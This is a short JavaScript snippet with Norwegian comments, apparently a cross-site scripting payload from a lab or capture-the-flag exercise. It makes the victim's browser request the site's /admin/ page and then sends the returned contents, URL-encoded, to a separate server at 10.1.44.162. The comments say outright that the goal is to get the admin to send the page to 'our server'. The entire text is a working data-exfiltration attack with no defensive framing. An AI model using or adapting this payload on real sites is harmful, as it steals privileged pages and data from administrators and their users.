
    xhr = new XMLHttpRequest();  //vi gjør en XML GET request i admin.
    xhr.open("GET","/admin/");
    xhr.send();
    xhr.onload = function(){
         request = new XMLHttpRequest();
         request.open("GET", "http://10.1.44.162/"+encodeURI(xhr.responseText), true);  //vi får admin til å sende innholdet enkodet til får server.
         request.send();
}    